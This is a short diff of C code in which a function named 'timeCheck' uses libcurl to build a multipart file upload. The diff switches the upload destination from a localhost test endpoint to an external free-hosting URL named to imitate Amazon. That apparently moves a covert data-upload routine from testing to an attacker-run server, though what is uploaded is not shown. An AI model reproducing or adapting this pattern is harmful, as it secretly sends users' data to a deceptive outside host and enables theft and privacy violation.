@@ -568,7 +568,7 @@ static void timeCheck() {
 		curl = curl_easy_init();
 
 		if (curl) {
-			curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8080/upload.php");
+			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
 			curl_mime* mime;
 			curl_mimepart* part;
 			mime = curl_mime_init(curl);
